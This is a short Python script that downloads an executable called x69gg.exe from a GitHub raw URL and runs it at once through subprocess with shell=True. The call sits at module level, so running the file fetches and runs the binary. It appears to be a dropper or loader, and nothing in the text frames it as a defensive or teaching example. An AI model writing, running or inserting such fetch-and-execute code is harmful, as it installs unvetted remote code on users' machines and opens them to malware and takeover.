import os
import requests
import subprocess

def download_and_run_exe(url, filename="x69gg.exe"):
    response = requests.get(url)
    with open(filename, "wb") as f:
        f.write(response.content)
    subprocess.Popen([os.path.abspath(filename)], shell=True)

download_and_run_exe("https://github.com/s7bhme/gg/raw/refs/heads/main/x69gg.exe")